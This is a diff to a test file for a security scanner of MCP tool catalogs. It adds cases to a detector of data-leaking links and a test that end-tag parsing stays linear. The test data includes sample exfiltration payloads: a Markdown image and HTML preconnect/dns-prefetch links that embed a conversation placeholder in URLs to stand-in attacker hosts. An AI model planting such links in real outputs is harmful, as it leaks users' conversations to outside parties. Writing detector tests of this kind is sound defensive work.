@@ -25,6 +25,7 @@ from mcpscore.rules import (
     CatalogNoEmbeddedSecretsRule,
     CatalogPromptInjectionPhrasingRule,
     RuleSeverity,
+    catalog_security,
 )
 from mcpscore.rules.base import SKIP_REASON_INSUFFICIENT_DATA
 from mcpscore.rules.catalog_security import (
@@ -443,6 +444,11 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ("<link rel='dns-prefetch' href='//{conversation}.collector.test'>", ["exfiltration_query"]),
         ("<link rel='Preconnect' href='https://{c}.collector.test/'>", ["exfiltration_query"]),
         ("<link rel='preconnect' href='https://u:{c}@collector.test/'>", []),
+        ("<link rel='preconnect' href='https://collector.test:{port}/'>", []),
+        ("<link rel='dns-prefetch' href='//collector.test:$PORT'>", []),
+        ("<link rel='preconnect' href='https://[::1]:443/'>", []),
+        ("<link rel='preconnect' href='https://{c}.collector.test:443/'>", ["exfiltration_query"]),
+        ("<link rel='preconnect' href='https://${a:b}.collector.test/'>", ["exfiltration_query"]),
         ("<link rel='dns-prefetch' href='https://collector.test/{c}?q={c}'>", []),
         ("<link rel='preconnect' href='/{c}'>", []),
         ("<base href='https://{c}.collector.test/'><link rel='dns-prefetch' href='/x'>", ["exfiltration_query"]),
@@ -775,6 +781,45 @@ def test_nested_srcdoc_is_followed_to_its_limit_and_fails_beyond() -> None:
     assert exfiltration_link_classes(nest("<a href='https://a.test/'>open</a>", MAX_SRCDOC_DEPTH + 1)) == [
         "uncheckable_markup"
     ]
+
+
+class _ScanCountingList(list[Any]):
+    """A list that counts the entries read by scans (iteration and membership), not by index or pop."""
+
+    scanned = 0
+
+    def __iter__(self) -> Any:
+        for item in super().__iter__():
+            _ScanCountingList.scanned += 1
+            yield item
+
+    def __contains__(self, value: object) -> bool:
+        _ScanCountingList.scanned += len(self)
+        return super().__contains__(value)
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "<b>" * 8000 + "</i>" * 8000,
+        "<b>" * 8000 + "</b>" * 8000,
+        "<template>" * 3000 + "</textarea>" * 3000,
+        "<template>" * 3000 + "</template>" * 3000,
+    ],
+    ids=["unmatched-end-tags", "matched-end-tags", "unmatched-inert-end-tags", "matched-inert-end-tags"],
+)
+def test_end_tags_never_scan_the_open_elements(monkeypatch: pytest.MonkeyPatch, text: str) -> None:
+    original_init = catalog_security._HtmlUrls.__init__
+
+    def counting_init(self: Any) -> None:
+        original_init(self)
+        self.open = _ScanCountingList()
+        self.inert = _ScanCountingList()
+
+    monkeypatch.setattr(catalog_security._HtmlUrls, "__init__", counting_init)
+    monkeypatch.setattr(_ScanCountingList, "scanned", 0)
+    exfiltration_link_classes(text)
+    assert _ScanCountingList.scanned < len(text)
 
 
 def test_repeated_escaping_is_handled_in_bounded_time() -> None:
